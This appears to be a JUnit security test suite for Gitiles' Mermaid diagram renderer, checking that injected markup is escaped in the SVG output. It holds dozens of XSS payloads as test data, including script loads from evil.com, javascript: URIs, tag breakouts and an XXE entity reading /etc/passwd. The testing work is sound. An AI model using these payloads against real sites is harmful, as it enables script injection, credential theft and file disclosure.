// Copyright 2026 The Android Open Source Project
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package com.google.gitiles.doc;

import static com.google.common.truth.Truth.assertThat;

import com.google.common.html.types.SafeHtml;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import org.commonmark.node.Node;
import org.eclipse.jgit.lib.Config;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.JUnit4;

/**
 * Deep security test suite for {@link SimpleMermaidRenderer} covering SVG injection, XSS vectors,
 * XML entity attacks, protocol exploits, tag breakouts, and parser robustness.
 */
@RunWith(JUnit4.class)
public class SimpleMermaidRendererSecurityTest {

  // =========================================================================
  // 1. Script Element Injections
  // =========================================================================

  @Test
  public void testScriptTagVariationsInNodeLabels() {
    List<String> payloads =
        Arrays.asList(
            "<script>alert(1)</script>",
            "<script src='https://evil.com/xss.js'></script>",
            "<script src='//evil.com/xss.js'/>",
            "<sCrIpT>alert('case')</ScRiPt>",
            "<SCRIPT/SRC=\"data:text/javascript,alert(1)\">",
            "<script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script>",
            "<script><![CDATA[alert(1)]]></script>",
            "<script>/*<![CDATA[*/alert(1)/*]]>*/</script>",
            "<script defer>alert(1)</script>",
            "<script async>alert(1)</script>",
            "<script type=\"module\">import 'https://evil.com/x.js';</script>",
            "<script type=\"text/javascript\">alert(String.fromCharCode(88,83,83))</script>");

    for (String payload : payloads) {
      String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
      assertSafeSvg(code, payload);
    }
  }

  // =========================================================================
  // 2. ForeignObject and Embedded HTML Injections
  // =========================================================================

  @Test
  public void testForeignObjectAndEmbeddedHtmlInLabels() {
    List<String> payloads =
        Arrays.asList(
            "<foreignObject><body"
                + " xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></body></foreignObject>",
            "<foreignObject><iframe src=\"javascript:alert(1)\"></iframe></foreignObject>",
            "<foreignObject><iframe src=\"https://evil.com\"></iframe></foreignObject>",
            "<foreignObject><form action=\"//evil.com\"><input type=\"password\""
                + " name=\"pass\"></form></foreignObject>",
            "<foreignObject><embed src=\"evil.swf\"></embed></foreignObject>",
            "<foreignObject><object data=\"javascript:alert(1)\"></object></foreignObject>",
            "<foreignObject><audio src=\"x\" onerror=\"alert(1)\"></audio></foreignObject>",
            "<foreignObject><video src=\"x\" onerror=\"alert(1)\"></video></foreignObject>",
            "<foreignObject width=\"100\" height=\"100\"><div"
                + " xmlns=\"http://www.w3.org/1999/xhtml\"><span>HTML"
                + " Content</span></div></foreignObject>");

    for (String payload : payloads) {
      String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
      assertSafeSvg(code, payload);
    }
  }

  // =========================================================================
  // 3. Event Handler Attributes Injections
  // =========================================================================

  @Test
  public void testEventHandlerAttributesInLabels() {
    List<String> payloads =
        Arrays.asList(
            "<svg onload=\"alert('svg-onload')\">",
            "<svg onresize=\"alert(1)\">",
            "<img src=\"invalid-image.jpg\" onerror=\"alert('img-onerror')\">",
            "<body onload=\"alert('body-onload')\">",
            "<rect onmouseover=\"alert('rect-hover')\">",
            "<circle onclick=\"alert('circle-click')\">",
            "<polygon onfocus=\"alert('poly-focus')\">",
            "<text onpointerdown=\"alert('pointer')\">",
            "<path onanimationstart=\"alert('anim')\">",
            "<g ontouchstart=\"alert('touch')\">",
            "x\" onfocus=\"alert(1)\" autofocus=\"",
            "x' onclick='alert(1)' x='",
            "x` onmouseover=`alert(1)` `");

    for (String payload : payloads) {
      String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
      assertSafeSvg(code, payload);
    }
  }

  // =========================================================================
  // 4. Anchor and Protocol Injections
  // =========================================================================

  @Test
  public void testAnchorAndProtocolInjectionsInLabels() {
    List<String> payloads =
        Arrays.asList(
            "<a href=\"javascript:alert('a-href')\">Click Link</a>",
            "<a xlink:href=\"javascript:alert('xlink-href')\">Click Link</a>",
            "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Data Link</a>",
            "<a href=\"vbscript:msgbox(1)\">VBScript Link</a>",
            "<a href=\"java\0script:alert(1)\">Null Byte Protocol</a>",
            "<a href=\"java&#x0A;script:alert(1)\">Newline Protocol</a>",
            "<a href=\"java&#x09;script:alert(1)\">Tab Protocol</a>",
            "<a href=\"javascript&colon;alert(1)\">Entity Colon Protocol</a>",
            "<a href=\"blob:https://evil.com/uuid\">Blob Link</a>");

    for (String payload : payloads) {
      String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
      assertSafeSvg(code, payload);
    }
  }

  // =========================================================================
  // 5. SVG Animation Exploits (<animate>, <set>)
  // =========================================================================

  @Test
  public void testSvgAnimationExploitsInLabels() {
    List<String> payloads =
        Arrays.asList(
            "<animate onbegin=\"alert('anim-begin')\" attributeName=\"x\" dur=\"1s\" />",
            "<animate onend=\"alert('anim-end')\" attributeName=\"x\" dur=\"1s\" />",
            "<animate onrepeat=\"alert('anim-repeat')\" attributeName=\"x\" dur=\"1s\" />",
            "<animate attributeName=\"href\" values=\"javascript:alert(1)\" dur=\"1s\" />",
            "<animate attributeName=\"xlink:href\" values=\"javascript:alert(1)\" dur=\"1s\" />",
            "<set onbegin=\"alert('set-begin')\" attributeName=\"x\" dur=\"1s\" />",
            "<set attributeName=\"onmouseover\" to=\"alert(1)\" />",
            "<animateTransform attributeName=\"transform\" type=\"rotate\" from=\"0\" to=\"360\""
                + " onend=\"alert(1)\" />");

    for (String payload : payloads) {
      String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
      assertSafeSvg(code, payload);
    }
  }

  // =========================================================================
  // 6. SVG Resource and Reference Exploits (<use>, <image>, <feImage>)
  // =========================================================================

  @Test
  public void testSvgResourceAndReferenceExploitsInLabels() {
    List<String> payloads =
        Arrays.asList(
            "<use href=\"javascript:alert(1)\" />",
            "<use xlink:href=\"javascript:alert(1)\" />",
            "<use href=\"data:image/svg+xml;utf8,<svg id='x'"
                + " xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\" />",
            "<use xlink:href=\"https://evil.com/payload.svg#icon\" />",
            "<image href=\"javascript:alert(1)\" />",
            "<image xlink:href=\"javascript:alert(1)\" />",
            "<image href=\"data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" />",
            "<feImage href=\"javascript:alert(1)\" />",
            "<feImage xlink:href=\"https://evil.com/tracker.png\" />",
            "<pattern href=\"javascript:alert(1)\" />",
            "<pattern xlink:href=\"https://evil.com/xss.svg\" />");

    for (String payload : payloads) {
      String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
      assertSafeSvg(code, payload);
    }
  }

  // =========================================================================
  // 7. CSS and Style Injections
  // =========================================================================

  @Test
  public void testCssAndStyleInjectionsInLabels() {
    List<String> payloads =
        Arrays.asList(
            "<style>@import 'javascript:alert(1)';</style>",
            "<style>body { background: url(\"javascript:alert(1)\"); }</style>",
            "<style>* { -moz-binding: url('http://evil.com/xss.xml#test'); }</style>",
            "<style>svg { behavior: url(xss.htc); }</style>",
            "<style>@keyframes xss { from { background-image: url('javascript:alert(1)'); } }"
                + " </style>",
            "<div style=\"fill:expression(alert(1))\">Styled Div</div>",
            "<div style=\"background-image:url(javascript:alert(1))\">Background</div>",
            "<div style=\"behavior:url(xss.htc)\">HTC Component</div>");

    for (String payload : payloads) {
      String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
      assertSafeSvg(code, payload);
    }
  }

  // =========================================================================
  // 8. XML Structure and CDATA Breakout Payloads
  // =========================================================================

  @Test
  public void testXmlStructureAndCdataBreakoutPayloads() {
    List<String> payloads =
        Arrays.asList(
            "</text></svg><script>alert('tag-breakout')</script><svg><text>",
            "</tspan></text><iframe src='javascript:alert(1)'></iframe><text><tspan>",
            "]]><script>alert('cdata-breakout')</script><![CDATA[",
            "--> <script>alert('comment-breakout')</script> <!--",
            "<?xml-stylesheet href=\"javascript:alert(1)\"?>",
            "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>&xxe;",
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "\"><script>alert('quote-breakout')</script>",
            "'\"><script>alert('double-quote-breakout')</script>",
            "`><script>alert('backtick-breakout')</script>");

    for (String payload : payloads) {
      String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
      assertSafeSvg(code, payload);
    }
  }

  // =========================================================================
  // 9. Edge Labels and Infix Strokes Injection
  // =========================================================================

  @Test
  public void testEdgeLabelsAndInfixStrokesSecurity() {
    List<String> payloads =
        Arrays.asList(
            "<script>alert('pipe-edge')</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<img src=x onerror=alert('edge-onerror')>",
            "<svg onload=alert('edge-onload')>",
            "<foreignObject><script>alert(1)</script></foreignObject>",
            "</text></svg><script>alert('edge-breakout')</script><svg><text>");

    for (String payload : payloads) {
      String codePipe = "graph TD\n  A -->|\"" + payload.replace("\"", "\\\"") + "\"| B\n";
      assertSafeSvg(codePipe, payload);

      String codeInfixSolid = "graph TD\n  A -- \"" + payload.replace("\"", "\\\"") + "\" --> B\n";
      assertSafeSvg(codeInfixSolid, payload);

      String codeInfixThick = "graph TD\n  A == \"" + payload.replace("\"", "\\\"") + "\" ==> B\n";
      assertSafeSvg(codeInfixThick, payload);

      String codeInfixDashed = "graph TD\n  A -. \"" + payload.replace("\"", "\\\"") + "\" .-> B\n";
      assertSafeSvg(codeInfixDashed, payload);
    }
  }

  // =========================================================================
  // 10. Subgraph Titles and Aliases Injection
  // =========================================================================

  @Test
  public void testSubgraphTitlesAndAliasesSecurity() {
    List<String> payloads =
        Arrays.asList(
            "<script>alert('subgraph')</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<img src=x onerror=alert('sg-img')>",
            "<foreignObject><iframe src='https://evil.com'></iframe></foreignObject>",
            "</text></svg><script>alert('sg-breakout')</script><svg><text>");

    for (String payload : payloads) {
      String code =
          "graph TD\n"
              + "  subgraph Sg [\""
              + payload.replace("\"", "\\\"")
              + "\"]\n"
              + "    A[Node A]\n"
              + "  end\n"
              + "  A --> B\n";
      assertSafeSvg(code, payload);
    }
  }

  // =========================================================================
  // 11. Mermaid Directive Stripping Verification
  // =========================================================================

  @Test
  public void testMermaidDirectivesCannotInjectCode() {
    String code =
        """
        graph TD
          A[Node A] --> B[Node B]
          click A href "javascript:alert('click-href')"
          click B call alert('click-call')
          click A "javascript:alert('click-positional')"
          style A fill:url(javascript:alert('style-fill'))
          style B stroke:url(data:image/svg+xml,<svg onload=alert(1)>)
          classDef evil fill:red,stroke:url(javascript:alert(1));
          class A evil
          linkStyle 0 stroke:url(javascript:alert(1));
        """;

    SvgDoc svg = SvgDoc.render(code);
    svg.assertNoDangerousTags();

    String raw = SimpleMermaidRenderer.renderToSvg(code).get();
    assertThat(raw).doesNotContain("javascript:");
    assertThat(raw).doesNotContain("href=");
    assertThat(raw).doesNotContain("xlink:href");
    assertThat(raw).doesNotContain("onclick=");
    assertThat(raw).doesNotContain("onmouseover=");
  }

  // =========================================================================
  // 12. Parser Stress, Recursion, and Malformed Characters
  // =========================================================================

  @Test
  public void testNullBytesAndControlCharactersInInput() {
    String codeWithNulls = "graph TD\n  A[\"Null\0Byte\u0001Control\u0008Test\"] --> B\n";
    SvgDoc svg = SvgDoc.render(codeWithNulls);
    svg.assertNoDangerousTags();
  }

  @Test
  public void testDeeplyNestedSubgraphsDosResistance() {
    StringBuilder sb = new StringBuilder();
    sb.append("graph TD\n");
    int depth = 25;
    for (int i = 0; i < depth; i++) {
      sb.append("  subgraph Level").append(i).append(" [\"Level ").append(i).append("\"]\n");
    }
    sb.append("    A[Deep Node]\n");
    for (int i = 0; i < depth; i++) {
      sb.append("  end\n");
    }
    sb.append("  A --> B[Outer Node]\n");

    SvgDoc svg = SvgDoc.render(sb.toString());
    svg.assertNoDangerousTags();
  }

  @Test
  public void testDenseCyclesAndMutualEdgesDosResistance() {
    StringBuilder sb = new StringBuilder();
    sb.append("graph TD\n");
    for (int i = 0; i < 30; i++) {
      sb.append("  N").append(i).append(" --> N").append((i + 1) % 30).append("\n");
      sb.append("  N").append((i + 1) % 30).append(" --> N").append(i).append("\n");
    }
    SvgDoc svg = SvgDoc.render(sb.toString());
    svg.assertNoDangerousTags();
  }

  // =========================================================================
  // 13. End-to-End MarkdownToHtml & Gitiles Integration
  // =========================================================================

  @Test
  public void testEndToEndMarkdownXssPrevention() {
    String md =
        """
        # Security Audit Title

        ```mermaid
        graph TD
          A["<script>alert('e2e-node')</script>"]
          B["<iframe src='javascript:alert(1)'></iframe>"]
          C["<img src=x onerror=alert('e2e-img')>"]
          D["<foreignObject><iframe src='http://evil.com'></iframe></foreignObject>"]
          A -->|"<script>alert('e2e-edge')</script>"| B
          B --> C --> D
          click A href "javascript:alert('e2e-click')"
        ```
        """;

    Config cfg = new Config();
    cfg.setBoolean("markdown", null, "mermaid", true);
    MarkdownConfig mc = new MarkdownConfig(cfg);
    Node node = GitilesMarkdown.parse(mc, md);
    SafeHtml html =
        MarkdownToHtml.builder()
            .setConfig(mc)
            .setFilePath("security_test.md")
            .build()
            .toSoyHtml(node);

    assertThat(html).isNotNull();
    String htmlStr = html.getSafeHtmlString();

    // Verify container and SVG exist
    assertThat(htmlStr).contains("<div class=\"mermaid-container\"><svg class=\"mermaid-svg\"");
    String mermaidPart = htmlStr.substring(htmlStr.indexOf("<div class=\"mermaid-container\">"));

    // Verify no executable HTML tags exist in the Mermaid output
    for (String tag : SvgDoc.DANGEROUS_TAGS) {
      assertThat(mermaidPart).doesNotContain("<" + tag);
      assertThat(mermaidPart).doesNotContain("</" + tag + ">");
    }

    // Verify all payloads are safely encoded as XML entity text
    assertThat(htmlStr).contains("&lt;script&gt;alert(&apos;e2e-node&apos;)&lt;/script&gt;");
    assertThat(htmlStr)
        .contains("&lt;iframe src=&apos;javascript:alert(1)&apos;&gt;&lt;/iframe&gt;");
    assertThat(htmlStr).contains("&lt;img src=x onerror=alert(&apos;e2e-img&apos;)&gt;");
  }

  // =========================================================================
  // Helper Methods for Strict Security Validation
  // =========================================================================

  private void assertSafeSvg(String mermaidCode, String originalPayload) {
    Optional<String> svgOpt = SimpleMermaidRenderer.renderToSvg(mermaidCode);
    assertThat(svgOpt).isPresent();

    String rawSvg = svgOpt.get();

    // 1. Raw string inspection for any unescaped tags
    for (String tag : SvgDoc.DANGEROUS_TAGS) {
      assertThat(rawSvg).doesNotContain("<" + tag);
      assertThat(rawSvg).doesNotContain("</" + tag + ">");
    }

    // 2. XML DOM inspection ensuring strictly valid XML document with 0 dangerous elements
    SvgDoc svg = new SvgDoc(rawSvg);
    svg.assertAllInvariants();

    // 3. Confirm original payload text is preserved in text nodes
    assertThat(svg.findText(originalPayload)).isNotNull();
  }
}
